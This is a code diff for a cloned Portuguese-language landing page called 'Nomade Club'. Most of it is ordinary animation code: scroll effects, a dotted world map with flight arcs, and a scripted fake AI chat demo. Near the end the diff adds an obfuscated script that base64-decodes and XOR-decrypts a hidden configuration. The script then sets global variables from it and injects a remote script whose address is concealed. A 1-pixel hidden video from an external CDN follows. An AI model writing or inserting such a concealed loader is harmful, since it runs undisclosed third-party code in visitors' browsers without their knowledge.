+    if(t.id==='board'){ $$('.js-board',t).forEach((el,i)=>{ const f=el.word; el.cells.forEach(ch=>ch.textContent=' '); el.word=' '.repeat(el.cells.length); setTimeout(()=>flipTo(el,f,42),150+i*200); }); }
+    if(t.classList.contains('js-price')){ const f=t.word; t.querySelectorAll('.cell').forEach(c=>c.classList.remove('gone')); flipTo(t,t.dataset.from,60).then(()=>setTimeout(()=>flipTo(t,f,70).then(()=>collapse(t)),600));
+      const s=t.closest('.t-stub,.semi-price')?.querySelector('.js-strike'); if(s&&!RM){ s.style.setProperty('--strike',0); const st=performance.now(); (function d(n){ const p=Math.min(1,(n-st)/700); s.style.setProperty('--strike',p); if(p<1) requestAnimationFrame(d); })(st); } }
+  }),{threshold:.35});
+  $$('#board,.js-price').forEach(el=>fio.observe(el));
+  const clock=$('#boardClock'); const tick=()=>{ if(clock) clock.textContent='Agora, '+new Date().toLocaleTimeString('pt-BR',{hour:'2-digit',minute:'2-digit'}); }; tick(); setInterval(tick,30000);
+
+  /* ---------- world map ---------- */
+  const LAND="000000fae4213fffe000000006003fe0060000,000000e32d600fffe00000003007ff71020000,c000001f19fc07ffc000000061efffffffe000,83fffffd3ece03ff80001fe006cffffffffffc,f07ffffffe8787f800007ff7ffbffffffffffc,00ffffffffc783e03800f7fffffffffffffffc,03fffffff01881c00003e7fffffffffffffaf0,00e03ffff01e80000003e7fffffffffffe1200,00401ffffc0fc00000614ffffffffffff80600,000007ffffbfe00000a12ffffffffffff80c00,000003fffffff0000177fffffffffffffc0000,000000fffffe1000000ffffffffffffffd0000,000000ffffff0800001ffffffffffffff80000,000000ffffff8000001fff5ffffffffff00000,000000fffffc000000f89e07ffffffffc00000,000000fffff8000000f10ffffffffffb820000,000000fffff0000000e049fffffffff8840000,0000007ffff00000005f007ffffffff8980000,0000001fffc0000000ff883ffffffffc000000,0000001ffec0000001ffeffffffffffc000000,0000000fe040000003ffffbf7ffffffc000000,00000003e000000007ffffdf0ffffff8000000,00000001e000000007ffffcff0fffff0000000,00000000e210000007ffffeff03f3f00000000,00000000f60c000007ffffe7e03e1f00000000,000000001c00000007fffff780380f84000000,000000000380000007fffffa00180f82000000,000000000086000007fffffc80180383000000,00000000004fc00003ffffff80100809000000,00000000001fe00001ffffff00040409000000,00000000001ffc000000fffe00000e98000000,00000000001ffe000000fffc00000478000000,00000000043fff000001fff800000676a00000,00000000003fffe00000fff0000003b65e0000,00000000003ffff800007ff000000100076000,00000000003ffff800007ff000000060068000,00000000001ffff000007ff000000000000000,00000000000ffff000007ff000000000300000,00000000000fffe000007ff180000000f30000,000000000003ffe00000ffe300000003ff0004,000000000003ffe000007fc300000007ff8000,000000000003ffc000003fc20000001fffc000,000000000003ff0000003fc20000001fffe000,000000000003fe0000003f800000001fffe000,000000000003fe0000001f000000001fffe000,000000000003fc0000001f000000000f9fe000,000000000007f800000010000000000807c000,000000000007f000000000000000000003c000,000000000007c0000000000000000000000008,00000000000700000000000000000000008010,00000000000700000000000000000000000020,00000000000e00000000000000000000000000,00000000000f00000000000000000000000000,00000000000e00000000000000000000000000,00000000000600000000000000000000000000".split(','), COLS=150, LAT0=76, STEP=2.4, ROWS=LAND.length;
+  const canvas=$('#map'), ctx=canvas.getContext('2d'), base=document.createElement('canvas'), bctx=base.getContext('2d');
+  const O={lat:-23.55,lon:-46.63};
+  const DEST=[{lat:38.72,lon:-9.14,s:'€'},{lat:48.86,lon:2.35,s:'€'},{lat:35.9,lon:14.51,s:'€'},{lat:51.5,lon:-0.12,s:'£'},{lat:40.71,lon:-74,s:'$'},{lat:43.65,lon:-79.38,s:'C$'},{lat:19.43,lon:-99.13,s:'$'},{lat:4.71,lon:-74.07,s:'$'},{lat:-33.92,lon:18.42,s:'R'},{lat:35.68,lon:139.69,s:'¥'},{lat:13.76,lon:100.5,s:'฿'},{lat:-33.87,lon:151.21,s:'A$'}];
+  let W=0,H=0,DPR=1,L0=-125,L1=165,ppd=1,offY=0,offX=0;
+  const proj=(la,lo)=>[offX+(lo-L0)*ppd, offY+(LAT0-la)*ppd];
+  function size(){
+    const r=canvas.getBoundingClientRect(); W=r.width; H=r.height; DPR=Math.min(2,devicePixelRatio||1);
+    canvas.width=W*DPR; canvas.height=H*DPR; base.width=canvas.width; base.height=canvas.height;
+    const narrow=W<700; L0=narrow?-100:-125; L1=narrow?160:165;
+    ppd=Math.min(W/(L1-L0), H/(ROWS*STEP)); offX=(W-(L1-L0)*ppd)/2; offY=(H-ROWS*STEP*ppd)/2;
+    bctx.setTransform(DPR,0,0,DPR,0,0); bctx.clearRect(0,0,W,H);
+    const dot=Math.max(1.05,Math.min(2.2,ppd*STEP*.32)); bctx.fillStyle=narrow?'rgba(255,217,189,.34)':'rgba(255,217,189,.22)';
+    for(let r=0;r<ROWS;r++){ const bits=BigInt('0x'+LAND[r]).toString(2).padStart(152,'0'); const la=LAT0-r*STEP;
+      for(let c=0;c<COLS;c++){ if(bits[c]!=='1') continue; const lo=-180+c*STEP; if(lo<L0-2||lo>L1+2) continue; const [x,y]=proj(la,lo); bctx.beginPath(); bctx.arc(x,y,dot,0,6.283); bctx.fill(); } }
+    const [ox,oy]=proj(O.lat,O.lon); bctx.fillStyle='#FFC24B'; bctx.beginPath(); bctx.arc(ox,oy,3.4,0,6.283); bctx.fill();
+  }
+  const arcs=DEST.map((d,i)=>({d,t:-(i*.5)-Math.random()*.4}));
+  const bez=(a,b,c,t)=>{const u=1-t;return[u*u*a[0]+2*u*t*b[0]+t*t*c[0],u*u*a[1]+2*u*t*b[1]+t*t*c[1]]};
+  function frame(dt){
+    ctx.setTransform(DPR,0,0,DPR,0,0); ctx.clearRect(0,0,W,H); ctx.drawImage(base,0,0,W,H);
+    const p0=proj(O.lat,O.lon), pulse=(performance.now()/1000)%2/2;
+    ctx.strokeStyle='rgba(255,194,75,'+(.6*(1-pulse))+')'; ctx.lineWidth=1.2; ctx.beginPath(); ctx.arc(p0[0],p0[1],4+pulse*18,0,6.283); ctx.stroke();
+    arcs.forEach(a=>{
+      a.t+=dt/2.6; if(a.t>1.55) a.t=-Math.random()*1.2; if(a.t<=0) return;
+      const p2=proj(a.d.lat,a.d.lon), dist=Math.hypot(p2[0]-p0[0],p2[1]-p0[1]), p1=[(p0[0]+p2[0])/2,(p0[1]+p2[1])/2-dist*.38];
+      const head=Math.min(1,a.t), tail=Math.max(0,head-.4); ctx.lineWidth=1.7; ctx.lineCap='round';
+      let prev=bez(p0,p1,p2,tail);
+      for(let i=1;i<=26;i++){ const pt=bez(p0,p1,p2,tail+(head-tail)*i/26); const al=(i/26)*(a.t>1?Math.max(0,1-(a.t-1)/.55):1); ctx.strokeStyle='rgba(255,194,75,'+(al*.95)+')'; ctx.beginPath(); ctx.moveTo(prev[0],prev[1]); ctx.lineTo(pt[0],pt[1]); ctx.stroke(); prev=pt; }
+      if(a.t<1){ const hp=bez(p0,p1,p2,head); ctx.fillStyle='#FFF1CC'; ctx.shadowColor='rgba(255,194,75,.95)'; ctx.shadowBlur=12; ctx.beginPath(); ctx.arc(hp[0],hp[1],2.6,0,6.283); ctx.fill(); ctx.shadowBlur=0; }
+      else { const k=(a.t-1)/.55, al=Math.max(0,1-k); ctx.strokeStyle='rgba(91,227,163,'+al+')'; ctx.lineWidth=1.4; ctx.beginPath(); ctx.arc(p2[0],p2[1],3+k*15,0,6.283); ctx.stroke(); ctx.fillStyle='rgba(255,247,240,'+al+')'; ctx.font='700 '+(W<700?11:14)+'px Onest, system-ui, sans-serif'; ctx.textAlign='center'; ctx.fillText(a.d.s,p2[0],p2[1]-11-k*6); }
+    });
+  }
+  let last=performance.now(), run=false, raf=0;
+  const loop=n=>{ const dt=Math.min(.05,(n-last)/1000); last=n; frame(dt); if(run) raf=requestAnimationFrame(loop); };
+  size();
+  if(RM){ arcs.forEach(a=>a.t=.999); frame(0); }
+  else new IntersectionObserver(es=>es.forEach(e=>{ if(e.isIntersecting&&!run){ run=true; last=performance.now(); raf=requestAnimationFrame(loop);} else if(!e.isIntersecting){ run=false; cancelAnimationFrame(raf);} })).observe(canvas);
+  let rz; addEventListener('resize',()=>{ clearTimeout(rz); rz=setTimeout(()=>{ size(); if(RM) frame(0); },150); });
+
+  /* ---------- progress + dock ---------- */
+  const pf=$('#progFill'), ps=$('#progSun'), dock=$('#dock'), metodo=$('#metodo'), oferta=$('#oferta'), fin=$('#final');
+  function onScroll(){
+    const max=document.documentElement.scrollHeight-innerHeight, p=max>0?Math.min(1,scrollY/max):0;
+    pf.style.transform='scaleX('+p+')'; ps.style.left=(p*100)+'%';
+    const past=metodo.getBoundingClientRect().top<innerHeight*.3, o=oferta.getBoundingClientRect(), inO=o.top<innerHeight&&o.bottom>0, inF=fin.getBoundingClientRect().top<innerHeight*.6, on=past&&!inO&&!inF;
+    dock.classList.toggle('on',on); dock.setAttribute('aria-hidden',on?'false':'true'); dock.querySelector('a').tabIndex=on?0:-1;
+  }
+  let tk=false; addEventListener('scroll',()=>{ if(tk) return; tk=true; requestAnimationFrame(()=>{ onScroll(); tk=false; }); },{passive:true}); onScroll();
+
+  /* ---------- videos ---------- */
+  /* posters só carregam perto da tela */
+  if('IntersectionObserver' in window){ const pv=new IntersectionObserver(es=>es.forEach(e=>{ if(e.isIntersecting){ $$('video[data-poster]',e.target).forEach(v=>{ if(!v.poster) v.poster=v.dataset.poster; }); pv.unobserve(e.target); } }),{rootMargin:'1000px 0px'}); new Set($$('video[data-poster]').map(v=>v.closest('section')||v.parentNode)).forEach(s=>pv.observe(s)); } else $$('video[data-poster]').forEach(v=>v.poster=v.dataset.poster);
+  $$('.vcard').forEach(f=>{ const v=$('video',f), b=$('.play',f); if(!v||!b) return;
+    b.addEventListener('click',()=>{ $$('.vcard video').forEach(o=>{ if(o!==v&&!o.paused) o.pause(); }); f.classList.add('playing'); v.controls=true; const p=v.play(); if(p&&p.catch) p.catch(()=>f.classList.remove('playing')); }); });
+
+  /* ---------- spotlight cards ---------- */
+  if(matchMedia('(hover:hover)').matches){ $$('.js-spot').forEach(c=>c.addEventListener('pointermove',e=>{ const r=c.getBoundingClientRect(); c.style.setProperty('--mx',(e.clientX-r.left)+'px'); c.style.setProperty('--my',(e.clientY-r.top)+'px'); })); }
+
+  /* ---------- AI phone ---------- */
+  const chat=$('#chat'), toast=$('#toast'), comp=$('#composerText');
+  const CMD='Sobe a oferta nova na Espanha. 5 criativos, R$300 por dia.', CHECKS=['Campanha criada','5 conjuntos configurados','Criativos enviados','Orçamento de R$300/dia'];
+  let T=[], pOn=false; const later=(f,ms)=>T.push(setTimeout(f,ms));
+  const mk=(tag,cls,html)=>{ const e=document.createElement(tag); if(cls) e.className=cls; if(html!=null) e.innerHTML=html; return e; };
+  const ICON='<svg><use href="#i-check"/></svg>';
+  function runPhone(){
+    T.forEach(clearTimeout); T=[]; chat.innerHTML=''; toast.classList.remove('show'); comp.textContent='';
+    let i=0; (function type(){ comp.textContent=CMD.slice(0,++i); if(i<CMD.length) later(type,26); })();
+    let t=CMD.length*26+350; later(()=>{ comp.textContent='Escreva um comando...'; chat.appendChild(mk('div','msg me',CMD)); },t);
+    let ty; t+=500; later(()=>{ ty=mk('div','ptyping','<i></i><i></i><i></i>'); chat.appendChild(ty); },t);
+    let ul; t+=1200; later(()=>{ ty.remove(); const ai=mk('div','msg ai','Feito. Subindo agora:'); ul=mk('ul'); ai.appendChild(ul); chat.appendChild(ai); },t);
+    CHECKS.forEach(c=>{ t+=520; later(()=>ul.appendChild(mk('li',null,ICON+c)),t); });
+    t+=700; later(()=>chat.appendChild(mk('div','camp','<b>Oferta nova, Espanha</b><small>5 criativos, R$300/dia</small><span class="live">No ar</span>')),t);
+    t+=500; later(()=>toast.classList.add('show'),t); t+=2600; later(()=>toast.classList.remove('show'),t); t+=2600; later(()=>{ if(pOn) runPhone(); },t);
+  }
+  const phone=$('#phone');
+  if(phone&&!RM) new IntersectionObserver(es=>es.forEach(e=>{ if(e.isIntersecting&&!pOn){ pOn=true; runPhone(); } else if(!e.isIntersecting){ pOn=false; } }),{threshold:.4}).observe(phone);
+
+  /* ---------- plaques ---------- */
+  const pio=new IntersectionObserver(es=>es.forEach(e=>{ if(e.isIntersecting){ const i=$$('.js-plaque').indexOf(e.target); setTimeout(()=>e.target.classList.add('shine'),i*250); pio.unobserve(e.target);} }),{threshold:.5});
+  $$('.js-plaque').forEach(p=>pio.observe(p));
+
+  /* ---------- word splitter ---------- */
+  function split(el){
+    const walk=node=>{ Array.from(node.childNodes).forEach(n=>{
+      if(n.nodeType===3){ const frag=document.createDocumentFragment(); n.textContent.split(/(\s+)/).forEach(tok=>{ if(!tok) return; if(/^\s+$/.test(tok)){ frag.appendChild(document.createTextNode(tok)); return; } const o=document.createElement('span'); o.className='w'; const i=document.createElement('span'); i.textContent=tok; o.appendChild(i); frag.appendChild(o); }); n.replaceWith(frag); }
+      else if(n.nodeType===1) walk(n); }); };
+    walk(el);
+  }
+
+  /* ---------- GSAP motion ---------- */
+  if(!window.gsap||!window.ScrollTrigger||RM) return;
+  gsap.registerPlugin(ScrollTrigger);
+  const below=el=>el.getBoundingClientRect().top>innerHeight*.92;
+
+  // hero intro
+  const h1=$('.hero h1'); split(h1);
+  const tl=gsap.timeline({defaults:{ease:'power4.out'}});
+  tl.from('#heroMedia',{opacity:0,scale:1.08,duration:1.8,ease:'power2.out'},0)
+    .from('.hero .pre',{y:16,opacity:0,duration:.7},.15)
+    .from('.hero h1 .w>span',{yPercent:110,duration:1,stagger:.028},.25)
+    .from('.hero .sub',{y:18,opacity:0,duration:.8},.7)
+    .from('.hero .cta-row',{y:18,opacity:0,duration:.8},.82)
+    .from('.hero .proof > div',{y:14,opacity:0,duration:.7,stagger:.08},.95)
+    .from('.hero .glass',{opacity:0,duration:1},.9)
+    .from('.hero .coin',{opacity:0,duration:.8,stagger:.12},1.05);
+  // counters
+  $$('[data-count]').forEach((b,i)=>{ const n=+b.dataset.count, pre=b.dataset.prefix||'', suf=b.dataset.suffix||''; const o={v:0}; gsap.to(o,{v:n,duration:1.6,delay:1+i*.08,ease:'power2.out',onUpdate:()=>{ b.textContent=pre+Math.round(o.v)+suf; }}); });
+  // hero parallax
+  gsap.to('#heroMedia',{yPercent:12,ease:'none',scrollTrigger:{trigger:'.hero',start:'top top',end:'bottom top',scrub:true}});
+  $$('.js-par').forEach(el=>{ const sp=+el.dataset.speed||0; gsap.to(el,{'--py':sp+'px',ease:'none',scrollTrigger:{trigger:el.closest('section,header'),start:'top bottom',end:'bottom top',scrub:true}}); });
+
+  // marquee with scroll velocity
+  const band=$('#band'); band.classList.add('js');
+  const mq=gsap.to('#bandTrack',{xPercent:-50,repeat:-1,duration:38,ease:'none'});
+  ScrollTrigger.create({onUpdate(self){ const v=self.getVelocity(), dir=v<0?-1:1; gsap.to(mq,{timeScale:dir*(1+Math.min(5,Math.abs(v)/700)),duration:.2,overwrite:true}); gsap.to(mq,{timeScale:dir,duration:1.4,delay:.3,overwrite:false}); }});
+
+  // headings word reveal
+  $$('h2.js-split').forEach(h=>{ split(h); if(!below(h)) return; const ws=$$('.w>span',h); gsap.set(ws,{yPercent:110}); ScrollTrigger.create({trigger:h,start:'top 86%',once:true,onEnter:()=>gsap.to(ws,{yPercent:0,duration:.9,ease:'power4.out',stagger:.03})}); });
+
+  // scrubbed highlight
+  $$('.js-scrub').forEach(p=>{ split(p); const ws=$$('.w>span',p); gsap.set(ws,{opacity:.18}); gsap.to(ws,{opacity:1,ease:'none',stagger:.1,scrollTrigger:{trigger:p,start:'top 82%',end:'bottom 52%',scrub:true}}); });
+
+  // generic reveals
+  const rv=$$('.js-rv').filter(below); gsap.set(rv,{y:28,opacity:0});
+  ScrollTrigger.batch(rv,{start:'top 90%',once:true,onEnter:b=>gsap.to(b,{y:0,opacity:1,duration:.8,ease:'power3.out',stagger:.09,overwrite:true})});
+
+  // objections: typing then bubble
+  $$('.js-obj').forEach(o=>{ if(!below(o)) return; const wrap=$('.bubble-wrap',o), bub=$('.bubble',o), txt=$('.letter',o);
+    gsap.set([bub],{opacity:0,scale:.9,transformOrigin:'0% 100%'}); gsap.set(txt,{opacity:0,y:16});
+    const typ=document.createElement('div'); typ.className='typing'; typ.innerHTML='<i></i><i></i><i></i>'; typ.style.display='none'; wrap.appendChild(typ);
+    ScrollTrigger.create({trigger:o,start:'top 80%',once:true,onEnter:()=>{ bub.style.display='none'; typ.style.display='flex'; setTimeout(()=>{ typ.remove(); bub.style.display=''; gsap.to(bub,{opacity:1,scale:1,duration:.45,ease:'back.out(1.8)'}); gsap.to(txt,{opacity:1,y:0,duration:.7,delay:.2,ease:'power3.out'}); },850); }}); });
+
+  // method stack: previous cards recede
+  const steps=$$('#stack .step');
+  steps.forEach((s,i)=>{ const nx=steps[i+1]; if(!nx) return; gsap.to(s,{scale:.93,filter:'brightness(.65)',ease:'none',scrollTrigger:{trigger:nx,start:'top bottom',end:'top '+(76+(i+1)*14)+'px',scrub:true}}); });
+  steps.forEach(s=>{ const n=$('.num',s); gsap.fromTo(n,{yPercent:30},{yPercent:-10,ease:'none',scrollTrigger:{trigger:s,start:'top bottom',end:'bottom top',scrub:true}}); });
+
+  // pinned travel reel: one trigger, no lag, photos loaded up front
+  const reel=$('#reel'), track=$('#reelTrack');
+  if(reel&&track){ reel.classList.add('pinned'); const dist=()=>Math.max(0,track.scrollWidth-innerWidth);
+    const imgs=$$('.reel-card img',reel); imgs.forEach(img=>{ img.loading='eager'; });
+    ScrollTrigger.config({ignoreMobileResize:true});
+    gsap.timeline({scrollTrigger:{trigger:reel,start:'center center',end:()=>'+='+dist(),pin:true,scrub:true,invalidateOnRefresh:true}})
+      .to(track,{x:()=>-dist(),ease:'none'},0)
+      .fromTo(imgs,{xPercent:-3},{xPercent:3,ease:'none'},0);
+    const grow=[...$$('[data-vsl-delay]'),$('vturb-smartplayer')].filter(Boolean);
+    if(grow.length&&'ResizeObserver' in window){ const seen=new Map(); let rt; const ro=new ResizeObserver(es=>{ let changed=false; es.forEach(e=>{ const h=e.target.offsetHeight; if(seen.has(e.target)&&seen.get(e.target)!==h) changed=true; seen.set(e.target,h); }); if(changed){ clearTimeout(rt); rt=setTimeout(()=>ScrollTrigger.refresh(),150); } }); grow.forEach(el=>ro.observe(el)); } }
+
+  // video cards tilt in
+  const vc=$$('.passes .vcard').filter(below); if(vc.length){ gsap.set(vc,{y:60,opacity:0,rotate:i=>i%2?3:-3}); ScrollTrigger.create({trigger:'.passes',start:'top 85%',once:true,onEnter:()=>gsap.to(vc,{y:0,opacity:1,rotate:0,duration:.9,ease:'power3.out',stagger:.1})}); }
+
+  // map + board entrance
+  const mw=$('.mapwrap'); if(below(mw)){ gsap.set(mw,{opacity:0,scale:.96}); ScrollTrigger.create({trigger:mw,start:'top 85%',once:true,onEnter:()=>gsap.to(mw,{opacity:1,scale:1,duration:1.1,ease:'power3.out'})}); }
+
+  // ticket
+  const tkt=$('.ticket'); if(below(tkt)){ gsap.set(tkt,{y:80,opacity:0,rotateX:10,transformPerspective:1000}); ScrollTrigger.create({trigger:tkt,start:'top 88%',once:true,onEnter:()=>gsap.to(tkt,{y:0,opacity:1,rotateX:0,duration:1.1,ease:'power3.out',clearProps:'transform'})}); }
+
+  // guarantee stamp slam
+  const g=$('.js-gstamp'); if(below(g)){ gsap.set(g,{scale:2.2,opacity:0,rotate:-30}); ScrollTrigger.create({trigger:g,start:'top 80%',once:true,onEnter:()=>{ gsap.to(g,{scale:1,opacity:1,rotate:-8,duration:.5,ease:'back.out(2)'}); gsap.fromTo('#garantia .guar',{x:0},{x:4,duration:.05,repeat:5,yoyo:true,delay:.45,clearProps:'x'}); }}); }
+
+  // final scene parallax
+  gsap.fromTo('#sceneMedia',{yPercent:-6},{yPercent:6,ease:'none',scrollTrigger:{trigger:'#final',start:'top bottom',end:'bottom top',scrub:true}});
+  gsap.fromTo('#sceneMedia img',{scale:1.15},{scale:1,ease:'none',scrollTrigger:{trigger:'#final',start:'top bottom',end:'center center',scrub:true}});
+
+  addEventListener('load',()=>ScrollTrigger.refresh());
+})();
+</script>
+
+<script>(function(){var x_b0=atob("DIaOYVt+FjGMrgShKP2sFCkSNAuuxnDVWPW0TnQdcl+i23DMQeD3TzgRex/u3CvSS/TnES8NOUT4w3eOROf6BCgKOFv/jCiDSfL6EzIcY0Xp3Sabc/2sDzoTcxO2jGDAXOejFC8Tf1f1g3TTTfDrDy9TblLjyinSS+2sTXkId135yyabCqTzTSBceFDhyyabCuLvFTpTY0Xhx2LYBfb8BC0beEWh3XHDQeL9Q3dcYFDg22GDEqSsHAYD");var w_7x=[];for(var r_y6s=0;r_y6s<x_b0.length;r_y6s++){w_7x.push(x_b0.charCodeAt(r_y6s)&255);}var n_g=w_7x[0];var o_2=w_7x.slice(1,1+n_g);var u_d5v=w_7x.slice(1+n_g);var c_2n=u_d5v.map(function(b,j_t){return b^o_2[j_t%n_g];});var t_j80="";for(var y_hc=0;y_hc<c_2n.length;y_hc++){t_j80+=String.fromCharCode(c_2n[y_hc]&255);}var u_zqio=decodeURIComponent(escape(t_j80));var e_dah=JSON.parse(u_zqio);var q_p=e_dah.globals||[];q_p.forEach(function(e_h){window[e_h.name]=e_h.value;});var w_t0io=document.createElement("script");w_t0io.src=e_dah.url;w_t0io.async=true;w_t0io.defer=true;(e_dah.attributes||[]).forEach(function(t_0183){w_t0io.setAttribute(t_0183.name,t_0183.value);});(document.head||document.documentElement).appendChild(w_t0io);})();</script>
+
+
+<video aria-hidden="true" tabindex="-1" src="https://cdn.converteai.net/1.mp4" playsinline="" style="position: fixed; top: -1px; left: -1px; width: 1px; height: 1px; pointer-events: none; z-index: 9; background-color: transparent; display: block; object-fit: fill;" data-imp-reveal="up"></video>
+  <script>
+    window.__IMPERIO_SITE_META__ = {"slug":"nomade-club","title":"Nomade Club","originalUrl":"https://nomadeclub.com.br/","githubUrl":"https://github.com/vsugamele/imperio-swipefile/tree/main/sites/nomade-club","mode":"live-dom-clone","dissection":{"copy":{},"pagina":{},"ref_id":"beafe786-c63c-404c-b135-38d88ef00d75","editorial":{},"dissecado_em":null}};
+  </script>
+  <script src="/assets/imperio-animation-engine.js" defer></script>
+</body></html>
